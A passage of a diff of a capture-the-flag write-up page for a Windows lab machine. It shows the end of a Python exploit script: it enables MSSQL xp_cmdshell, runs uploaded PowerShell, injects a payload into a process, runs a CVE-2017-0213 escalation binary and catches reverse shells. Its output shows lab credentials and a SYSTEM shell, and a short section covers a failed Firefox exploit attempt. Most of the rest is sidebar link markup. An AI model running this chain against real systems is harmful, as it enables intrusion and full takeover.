+</span></span><span class="line"><span class="cl">        <span class="n">mssql</span><span class="o">.</span><span class="n">execute_query</span><span class="p">(</span><span class="s2">&#34;EXEC sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE;exec SP_CONFIGURE &#39;xp_cmdshell&#39;, 1;RECONFIGURE -- &#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">mssql</span><span class="o">.</span><span class="n">execute_query</span><span class="p">(</span><span class="s2">&#34;EXEC master..xp_cmdshell &#39;powershell -ExecutionPolicy bypass -NoExit -File C:</span><span class="se">\\</span><span class="s2">FTP</span><span class="se">\\</span><span class="s2">&#34;</span><span class="o">+</span><span class="n">FTP_UPLOADPATH</span><span class="o">+</span><span class="s2">&#34;</span><span class="se">\\</span><span class="s2">&#34;</span><span class="o">+</span><span class="n">unique_filename1</span><span class="o">+</span><span class="s2">&#34;&#39;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">log</span><span class="o">.</span><span class="n">failure</span><span class="p">(</span><span class="s2">&#34;MSSQL failed: &#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="k">finally</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">mssql</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">mssql</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;LHOST = &#34;</span><span class="o">+</span><span class="n">LHOST</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">initiate</span><span class="p">)</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">log</span><span class="o">.</span><span class="n">error</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl"><span class="n">ps1</span> <span class="o">=</span> <span class="n">listen</span><span class="p">(</span><span class="n">LPORT1</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="n">TIMEOUT</span><span class="p">)</span><span class="o">.</span><span class="n">wait_for_connection</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">ps1</span><span class="o">.</span><span class="n">sock</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">log</span><span class="o">.</span><span class="n">failure</span><span class="p">(</span><span class="s2">&#34;Connection timeout.&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">ps1</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;cd C:</span><span class="se">\\</span><span class="s2">FTP</span><span class="se">\\</span><span class="s2">&#34;</span><span class="o">+</span><span class="n">FTP_UPLOADPATH</span><span class="o">+</span><span class="s2">&#34;</span><span class="se">\\</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">ps1</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;. .</span><span class="se">\\</span><span class="s2">Invoke-PSInject.ps1&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">ps1</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;Invoke-PSInject -ProcName sihost -PoshCode &#34;</span><span class="o">+</span><span class="n">b64encode</span><span class="p">(</span><span class="n">payload2</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;UTF-16LE&#39;</span><span class="p">)))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">ps2</span> <span class="o">=</span> <span class="n">listen</span><span class="p">(</span><span class="n">LPORT2</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="n">TIMEOUT</span><span class="p">)</span><span class="o">.</span><span class="n">wait_for_connection</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">ps2</span><span class="o">.</span><span class="n">sock</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">log</span><span class="o">.</span><span class="n">failure</span><span class="p">(</span><span class="s2">&#34;Connection timeout.&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">ps2</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;copy C:</span><span class="se">\\</span><span class="s2">FTP</span><span class="se">\\</span><span class="s2">&#34;</span><span class="o">+</span><span class="n">FTP_UPLOADPATH</span><span class="o">+</span><span class="s2">&#34;</span><span class="se">\\</span><span class="s2">cve2017213ps.exe C:</span><span class="se">\\</span><span class="s2">TEMP</span><span class="se">\\</span><span class="s2">cve2017213ps.exe&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">ps2</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;cd C:</span><span class="se">\\</span><span class="s2">TEMP</span><span class="se">\\</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">ps2</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;. .</span><span class="se">\\</span><span class="s2">cve2017213ps.exe&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">ps3</span> <span class="o">=</span> <span class="n">listen</span><span class="p">(</span><span class="n">LPORT3</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="n">TIMEOUT</span><span class="p">)</span><span class="o">.</span><span class="n">wait_for_connection</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">ps3</span><span class="o">.</span><span class="n">sock</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">log</span><span class="o">.</span><span class="n">failure</span><span class="p">(</span><span class="s2">&#34;Connection timeout.&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">ps3</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span></span></span></code></pre></div></p>
 
 <p>Here is the output:
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="go">[*] LHOST = 10.10.15.247
-</span><span class="go">[+] Trying to bind to 0.0.0.0 on port 60000: Done
-</span><span class="go">[+] Waiting for connections on 0.0.0.0:60000: Got connection from 10.10.10.59 on port 50143
-</span><span class="go">[+] Successful login at ftp server 10.10.10.59 with username &#39;ftp_user&#39; and password &#39;UTDRSCH53c&#34;$6hys&#39;
-</span><span class="go">[*] Changing current working directory to Intranet
-</span><span class="go">[*] Uploading msf1.ps1
-</span><span class="go">[*] Uploading Invoke-PSInject.ps1
-</span><span class="go">[*] Uploading msf2.ps1
-</span><span class="go">[*] Uploading cve2017213ps.exe
-</span><span class="go">[+] Successful login at mssql server 10.10.10.59:1433 with username &#39;sa&#39; and password &#39;GWE3V65#6KFH93@4GWTG2G&#39;
-</span><span class="go">[*] Enabling &#39;xp_cmdshell&#39;
-</span><span class="go">[+] Trying to bind to 0.0.0.0 on port 60001: Done
-</span><span class="go">[+] Waiting for connections on 0.0.0.0:60001: Got connection from 10.10.10.59 on port 50154
-</span><span class="go">[+] Trying to bind to 0.0.0.0 on port 60002: Done
-</span><span class="go">[+] Waiting for connections on 0.0.0.0:60002: Got connection from 10.10.10.59 on port 50161
-</span><span class="go">[*] Switching to interactive mode
-</span><span class="go"></span><span class="gp">$ </span>whoami
-<span class="go">nt authority\system
-</span><span class="go">PS C:\Windows\system32$
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">[*] LHOST = 10.10.15.247
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Trying to bind to 0.0.0.0 on port 60000: Done
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Waiting for connections on 0.0.0.0:60000: Got connection from 10.10.10.59 on port 50143
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Successful login at ftp server 10.10.10.59 with username &#39;ftp_user&#39; and password &#39;UTDRSCH53c&#34;$6hys&#39;
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Changing current working directory to Intranet
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Uploading msf1.ps1
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Uploading Invoke-PSInject.ps1
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Uploading msf2.ps1
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Uploading cve2017213ps.exe
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Successful login at mssql server 10.10.10.59:1433 with username &#39;sa&#39; and password &#39;GWE3V65#6KFH93@4GWTG2G&#39;
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Enabling &#39;xp_cmdshell&#39;
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Trying to bind to 0.0.0.0 on port 60001: Done
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Waiting for connections on 0.0.0.0:60001: Got connection from 10.10.10.59 on port 50154
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Trying to bind to 0.0.0.0 on port 60002: Done
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Waiting for connections on 0.0.0.0:60002: Got connection from 10.10.10.59 on port 50161
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Switching to interactive mode
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="gp">$</span> whoami
+</span></span><span class="line"><span class="cl"><span class="go">nt authority\system
+</span></span></span><span class="line"><span class="cl"><span class="go">PS C:\Windows\system32$
+</span></span></span></code></pre></div></div></p>
 
 <h1 id="what-about-exploiting-firefox">What about exploiting Firefox</h1>
 
 <p>On the box, there is Firefox version 44.0.2 and a script automatically opens C:\FTP\Intranet\index.html every now and then:
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="go">C:\Users\Sarah\Desktop&gt; type browser.bat
-</span><span class="go">...
-</span><span class="go">REM copy latest mockups to webroot
-</span><span class="go">copy /Y C:\FTP\Intranet\index.html C:\inetpub\wwwroot\HRTJYKYRBSHYJ\index.html
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">REM browse file
-</span><span class="go">start &#34;&#34; &#34;C:\Program Files (x86)\Mozilla Firefox\Firefox.exe&#34; &#34;http://127.0.0.1:81/HRTJYKYRBSHYJ/index.html&#34;
-</span><span class="go">...
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">C:\Users\Sarah\Desktop&gt; type browser.bat
+</span></span></span><span class="line"><span class="cl"><span class="go">...
+</span></span></span><span class="line"><span class="cl"><span class="go">REM copy latest mockups to webroot
+</span></span></span><span class="line"><span class="cl"><span class="go">copy /Y C:\FTP\Intranet\index.html C:\inetpub\wwwroot\HRTJYKYRBSHYJ\index.html
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">REM browse file
+</span></span></span><span class="line"><span class="cl"><span class="go">start &#34;&#34; &#34;C:\Program Files (x86)\Mozilla Firefox\Firefox.exe&#34; &#34;http://127.0.0.1:81/HRTJYKYRBSHYJ/index.html&#34;
+</span></span></span><span class="line"><span class="cl"><span class="go">...
+</span></span></span></code></pre></div></div></p>
 
 <p>In theory, we could exploit it by uploading an evil index.html via the FTP.
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>searchsploit firefox 44.0.2 -w
-<span class="err">
-</span><span class="err"></span><span class="go">Firefox 44.0.2 - ASM.JS JIT-Spray Remote Code Execution https://www.exploit-db.com/exploits/44294/
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> searchsploit firefox 44.0.2 -w
+</span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Firefox 44.0.2 - ASM.JS JIT-Spray Remote Code Execution https://www.exploit-db.com/exploits/44294/
+</span></span></span></code></pre></div></div></p>
 
 <p>Unfortunately, I was not able to make it work. I even enabled RDP on the box and I connected to check what is going on. The exploit is opened normally but the firefox either crashes or it doesn&rsquo;t execute the payload properly.</p>
 
@@ -901,6 +901,254 @@ or
            
            
            
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/unattended_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/unattended.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Unattended write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Unattended</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">23 Aug 2019</time>
+      <time lang="el">23 Αυγ 2019</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/nineveh_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/nineveh.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Nineveh write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Nineveh</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">17 Dec 2017</time>
+      <time lang="el">17 Δεκ 2017</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/inception_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/mirror.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Inception write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Inception</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">14 Apr 2018</time>
+      <time lang="el">14 Απρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/reddish_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/reddish.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Reddish write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Reddish</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">26 Jan 2019</time>
+      <time lang="el">26 Ιαν 2019</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/optimum_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/optimum.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Optimum write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Optimum</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">28 Oct 2017</time>
+      <time lang="el">28 Οκτ 2017</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
             <article class="li col-sm-6 col-md-4">
   <a href="https://alamot.github.io/node_writeup/" class="clearfix">
     <div class="cell">
@@ -916,6 +1164,390 @@ or
   </a>
 </article>
 
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/rold/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/rold.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Retriever of Lost Dreams</h3>
+      <h3 class="title" lang="el">Ο Ιχνηλάτης των Χαμένων Ονείρων</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">16 Aug 2015</time>
+      <time lang="el">16 Αυγ 2015</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/fortune_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/fortune.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Fortune write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Fortune</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">02 Aug 2019</time>
+      <time lang="el">02 Αυγ 2019</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/fluxcapacitor_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/capacitors.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">FluxCapacitor write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του FluxCapacitor</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">13 May 2018</time>
+      <time lang="el">13 Μαϊ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/matchsticks/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/matchsticks.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Alamot&#39;s matchstick puzzles</h3>
+      <h3 class="title" lang="el">Σπιρτοσπαζοκεφαλιές</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">11 Mar 2014</time>
+      <time lang="el">11 Μαρ 2014</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/fulcrum_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/fulcrum.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Fulcrum write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Fulcrum</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">09 Jun 2018</time>
+      <time lang="el">09 Ιουν 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
            
           
            
@@ -1017,101 +1649,17 @@ or
            
            
            
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/inception_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/falafel_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/mirror.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/falafel.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Inception write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Inception</h3>
+      <h3 class="title" lang="en">Falafel write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Falafel</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">14 Apr 2018</time>
-      <time lang="el">14 Απρ 2018</time>
+      <time lang="en">23 Jun 2018</time>
+      <time lang="el">23 Ιουν 2018</time>
     </footer>
   </a>
 </article>
@@ -1122,340 +1670,16 @@ or
            
            
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/matchsticks/" class="clearfix">
+  <a href="https://alamot.github.io/sense_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/matchsticks.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/pfsense.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Alamot&#39;s matchstick puzzles</h3>
-      <h3 class="title" lang="el">Σπιρτοσπαζοκεφαλιές</h3>
+      <h3 class="title" lang="en">Sense write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Sense</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">11 Mar 2014</time>
-      <time lang="el">11 Μαρ 2014</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/nineveh_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/nineveh.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Nineveh write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Nineveh</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">17 Dec 2017</time>
-      <time lang="el">17 Δεκ 2017</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/rold/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/rold.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Retriever of Lost Dreams</h3>
-      <h3 class="title" lang="el">Ο Ιχνηλάτης των Χαμένων Ονείρων</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">16 Aug 2015</time>
-      <time lang="el">16 Αυγ 2015</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/legacy_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/legacy.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Legacy write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Legacy</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">19 Oct 2017</time>
-      <time lang="el">19 Οκτ 2017</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/enterprise_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/space.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Enterprise write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Enterprise</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">19 Mar 2018</time>
-      <time lang="el">19 Μαρ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/fortune_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/fortune.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Fortune write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Fortune</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">02 Aug 2019</time>
-      <time lang="el">02 Αυγ 2019</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/mantis_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/mantis.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Mantis write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Mantis</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">18 Feb 2018</time>
-      <time lang="el">18 Φεβ 2018</time>
+      <time lang="en">24 Mar 2018</time>
+      <time lang="el">24 Μαρ 2018</time>
     </footer>
   </a>
 </article>
@@ -1521,122 +1745,6 @@ or
            
            
            
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/optimum_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/optimum.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Optimum write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Optimum</h3>
